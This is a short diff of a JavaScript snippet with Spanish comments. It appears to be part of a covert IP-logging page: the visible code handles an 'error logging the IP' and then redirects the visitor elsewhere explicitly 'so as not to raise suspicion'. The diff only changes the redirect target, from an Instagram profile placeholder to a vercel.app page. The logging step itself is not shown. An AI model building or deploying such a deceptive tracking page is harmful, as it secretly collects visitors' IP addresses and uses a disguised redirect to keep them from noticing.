@@ -19,12 +19,12 @@
     await new Promise(resolve => setTimeout(resolve, 500));
 
     // Redirigir al usuario a tu perfil de Instagram para no levantar sospechas
-    window.location.href = 'https://www.instagram.com/tu_perfil'; // <-- ¡CAMBIA ESTO!
+    window.location.href = 'https://markethouseproyect.vercel.app/index.html'; // <-- ¡CAMBIA ESTO!
 
   } catch (error) {
     console.error('Error al registrar la IP:', error);
     // Incluso si hay un error, redirigimos para no romper la apariencia
-    window.location.href = 'https://www.instagram.com/tu_perfil'; // <-- ¡CAMBIA ESTO TAMBIÉN!
+    window.location.href = 'https://markethouseproyect.vercel.app/index.html'; // <-- ¡CAMBIA ESTO TAMBIÉN!
   }
 })();
 
